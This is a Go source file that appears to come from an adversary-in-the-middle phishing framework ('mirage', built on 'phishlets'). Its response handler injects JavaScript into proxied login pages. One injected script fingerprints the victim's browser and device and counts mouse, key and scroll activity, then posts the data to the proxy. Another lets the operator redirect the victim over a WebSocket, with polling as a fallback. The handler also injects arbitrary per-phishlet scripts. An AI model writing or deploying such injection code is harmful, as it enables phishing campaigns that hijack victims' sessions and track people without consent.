package response

import (
	"bytes"
	"fmt"
	"net/http"
	"strings"

	"github.com/travisbale/mirage/internal/aitm"
	"github.com/travisbale/mirage/internal/proxy"
)

const mirageMarkerStart = "/* __mirage_injected_start__ */"
const mirageMarkerEnd = "/* __mirage_injected_end__ */"

// JSInjector appends the telemetry collector and WebSocket redirect scripts
// into HTML responses before </body>.
type JSInjector struct{}

func (h *JSInjector) Name() string { return "JSInjector" }

func (h *JSInjector) Handle(ctx *aitm.ProxyContext, resp *http.Response) error {
	if ctx.Session == nil || !isHTMLResponse(resp) {
		return nil
	}
	bodyBytes, err := readBody(resp)
	if err != nil {
		return err
	}

	var scriptContent strings.Builder
	scriptContent.WriteString(buildTelemetryScript(ctx.Session.ID))
	scriptContent.WriteString(buildRedirectScript(ctx.Session.ID))

	if ctx.Phishlet != nil && resp.Request != nil {
		for _, jsInject := range ctx.Phishlet.JSInjects {
			if jsInject.TriggerDomain == resp.Request.Host &&
				jsInject.TriggerPath.MatchString(resp.Request.URL.Path) {
				scriptContent.WriteString(jsInject.Script)
			}
		}
	}

	scriptBlock := fmt.Sprintf("<script>%s\n%s\n%s</script>",
		mirageMarkerStart, scriptContent.String(), mirageMarkerEnd)
	bodyBytes = bytes.Replace(bodyBytes, []byte("</body>"), []byte(scriptBlock+"\n</body>"), 1)
	replaceBody(resp, bodyBytes)
	return nil
}

func isHTMLResponse(resp *http.Response) bool {
	return strings.HasPrefix(resp.Header.Get("Content-Type"), "text/html")
}

func buildTelemetryScript(sessionID string) string {
	return fmt.Sprintf(`(function(){var sid=%q;var d={};
try{var c=document.createElement("canvas");var gl=c.getContext("webgl");
if(gl){var ext=gl.getExtension("WEBGL_debug_renderer_info");
if(ext){d.webgl_renderer=gl.getParameter(ext.WEBGL_RENDERER);
d.webgl_vendor=gl.getParameter(ext.WEBGL_VENDOR);}}}catch(e){}
d.screen_width=screen.width;d.screen_height=screen.height;
d.color_depth=screen.colorDepth;d.pixel_ratio=window.devicePixelRatio||1;
d.timezone_offset=new Date().getTimezoneOffset();d.language=navigator.language;
d.platform=navigator.platform;d.hardware_concurrency=navigator.hardwareConcurrency||0;
d.device_memory=navigator.deviceMemory||0;d.touch_points=navigator.maxTouchPoints||0;
d.plugins_hash=(navigator.plugins&&navigator.plugins.length>0)?String(navigator.plugins.length):"";
d.fonts_detected=0;d.mouse_move_count=0;d.key_press_count=0;d.scroll_count=0;
document.addEventListener("mousemove",function(){d.mouse_move_count++;});
document.addEventListener("keydown",function(){d.key_press_count++;});
document.addEventListener("scroll",function(){d.scroll_count++;});
var start=Date.now();
setTimeout(function(){d.collection_ms=Date.now()-start;d.session_id=sid;
fetch("/t/"+sid,{method:"POST",headers:{"Content-Type":"application/json"},
body:JSON.stringify(d),credentials:"include"}).catch(function(){});},2500);})();`, sessionID)
}

func buildRedirectScript(sessionID string) string {
	return fmt.Sprintf(`(function(){var sid=%q;
var wsURL=(location.protocol==="https:"?"wss://":"ws://")+location.host+"/ws/"+sid;
var ws=new WebSocket(wsURL);
ws.onmessage=function(e){try{var data=JSON.parse(e.data);
if(data.redirect_url){top.location.href=data.redirect_url;}}catch(_){}ws.close();};
ws.onerror=function(){var poll=setInterval(function(){
fetch("/t/"+sid+"/done",{credentials:"include"})
.then(function(r){return r.json();})
.then(function(d){if(d.redirect_url){clearInterval(poll);top.location.href=d.redirect_url;}})
.catch(function(){});},3000);};})();`, sessionID)
}

var _ proxy.ResponseHandler = (*JSInjector)(nil)
